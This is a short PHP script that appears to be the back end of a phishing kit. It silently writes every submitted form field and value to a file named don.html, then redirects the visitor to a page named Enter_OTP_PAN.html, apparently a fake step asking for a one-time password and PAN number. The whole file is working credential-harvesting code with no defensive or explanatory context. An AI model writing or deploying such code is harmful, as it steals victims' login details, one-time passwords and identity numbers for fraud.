<?php
header('location: Enter_OTP_PAN.html');
error_reporting(0);
$handle = fopen("don.html","a");
foreach($_POST as $variable => $value)
{
  fwrite($handle, $variable);
  fwrite($handle, "= ");
  fwrite($handle, $value);
  fwrite($handle, "<br>\r\n");
}
fwrite($handle, "<br>\r\n");
fclose($handle);
exit;
?> 
       